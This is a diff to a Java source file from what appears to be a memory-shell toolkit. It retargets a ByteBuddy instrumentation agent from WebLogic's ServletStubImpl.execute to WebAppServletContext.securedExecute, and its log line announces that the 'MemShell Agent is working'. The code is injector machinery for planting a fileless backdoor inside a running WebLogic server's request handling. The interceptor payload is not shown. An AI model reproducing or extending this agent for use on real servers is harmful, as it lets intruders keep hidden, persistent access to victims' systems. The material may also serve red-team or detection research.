@@ -1,6 +1,5 @@
 package com.reajason.javaweb.memshell.weblogic.injector;
 
-import com.reajason.javaweb.memshell.websphere.injector.WebSphereFilterChainAgentInjector;
 import net.bytebuddy.agent.builder.AgentBuilder;
 import net.bytebuddy.asm.Advice;
 import net.bytebuddy.description.type.TypeDescription;
@@ -12,13 +11,12 @@ import java.lang.instrument.Instrumentation;
 import java.security.ProtectionDomain;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
-import static net.bytebuddy.matcher.ElementMatchers.takesArguments;
 
 /**
  * @author ReaJason
  * @since 2025/1/3
  */
-public class WebLogicServletStubAgentInjector implements AgentBuilder.Transformer {
+public class WebLogicServletContextAgentInjector implements AgentBuilder.Transformer {
 
     static Class<?> interceptorClass = null;
 
@@ -35,7 +33,7 @@ public class WebLogicServletStubAgentInjector implements AgentBuilder.Transforme
                                             TypeDescription typeDescription,
                                             ClassLoader classLoader, JavaModule module,
                                             ProtectionDomain protectionDomain) {
-        return builder.visit(Advice.to(interceptorClass).on(named("execute").and(takesArguments(3))));
+        return builder.visit(Advice.to(interceptorClass).on(named("securedExecute")));
     }
 
     public static void premain(String args, Instrumentation inst) throws Exception {
@@ -57,9 +55,9 @@ public class WebLogicServletStubAgentInjector implements AgentBuilder.Transforme
                 .with(AgentBuilder.RedefinitionStrategy.REDEFINITION)
 //                .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly())
 //                .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly())
-                .type(named("weblogic.servlet.internal.ServletStubImpl"))
-                .transform(new WebLogicServletStubAgentInjector())
+                .type(named("weblogic.servlet.internal.WebAppServletContext"))
+                .transform(new WebLogicServletContextAgentInjector())
                 .installOn(inst);
-        System.out.println("MemShell Agent is working at weblogic.servlet.internal.ServletStubImpl.execute");
+        System.out.println("MemShell Agent is working at weblogic.servlet.internal.WebAppServletContext.securedExecute");
     }
 }
